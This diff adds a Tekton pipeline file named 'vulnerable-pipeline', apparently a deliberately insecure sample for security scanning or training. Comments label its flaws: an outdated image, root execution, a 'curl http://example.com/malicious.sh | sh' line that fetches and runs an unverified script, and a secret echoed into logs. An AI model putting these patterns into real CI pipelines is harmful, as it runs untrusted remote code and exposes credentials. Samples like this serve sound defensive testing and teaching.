@@ -1,0 +1,20 @@
+apiVersion: tekton.dev/v1beta1
+kind: Pipeline
+metadata:
+  name: vulnerable-pipeline
+spec:
+  tasks:
+    - name: insecure-task
+      taskSpec:
+        steps:
+          - name: run-insecure-command
+            image: alpine:3.7  # Outdated and vulnerable image
+            script: |
+              #!/bin/sh
+              echo "Running as root user..."
+              id  # Verify we are root (Security Risk)
+
+              echo "Downloading an unverified script..."
+              curl -s http://example.com/malicious.sh | sh  # No checksum verification (Supply Chain Attack Risk)
+
+              echo "Exposing secret: $API_SECRET"  # Hardcoded Secret in Logs
